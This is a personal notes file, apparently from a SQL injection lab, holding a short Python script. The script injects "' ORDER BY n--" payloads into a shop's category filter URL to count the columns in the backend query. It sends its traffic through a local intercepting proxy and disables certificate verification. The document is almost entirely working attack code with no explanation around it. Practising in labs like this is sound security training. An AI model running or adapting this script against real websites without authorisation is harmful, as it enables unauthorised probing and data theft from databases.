---
aliases: ["sqli_lab3"]
tags: ['resource', 'web']
created: 2026-06-17
updated: 2026-06-17
type: resource
status: done
---

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} 
  
def order_by_attack(url):
    path = "filter?category=Gifts"
    for i in range(1,50):
        payload=f"' ORDER BY {i}--"
        r=requests.get(url+path+payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
            return i-1
        i=i+1
    return False
 
if __name__=="__main__":
    try:
        url = sys.argv[1].strip()         
    except IndexError:
        print(f"[ - ] Usage: {sys.argv[0]} <URL>")
        sys.exit(-1)
         
    col_num=order_by_attack(url)
    if col_num:
        print(f"The number of column is: {col_num}")
    else:
        print("Unsuccessful")
